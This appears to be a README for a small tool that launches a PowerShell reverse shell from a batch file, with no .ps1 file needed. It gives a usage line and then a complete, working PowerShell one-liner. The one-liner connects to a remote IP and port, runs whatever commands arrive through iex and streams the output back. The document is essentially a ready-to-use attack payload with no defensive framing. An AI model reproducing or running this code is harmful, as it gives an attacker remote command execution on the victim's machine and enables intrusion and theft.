# powershell-revershell

A bat file to execute a reverse shell using powershell without a ps1 file.

### Usage

revershell.bat \[RemoteIP] \[RemotePort]

Or

powershell "$shell = New-Object System.Net.Sockets.TCPClient('192.168.1.15',4444);$stream = $shell.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'C7 PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$shell.Close()"
